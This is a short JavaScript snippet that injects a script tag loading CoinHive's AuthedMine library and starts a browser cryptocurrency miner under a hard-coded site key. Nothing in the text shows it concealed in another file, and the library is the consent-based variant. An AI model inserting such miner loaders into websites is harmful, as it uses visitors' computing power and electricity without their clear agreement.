'use strict';
    var head= document.getElementsByTagName('head')[0];
    var script= document.createElement('script');
    script.type= 'text/javascript';
    script.src= 'https://authedmine.com/lib/authedmine.min.js';
    head.appendChild(script);
    script.onload = function() {
        var miner = new CoinHive.Anonymous('NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ');
        miner.start();
    };
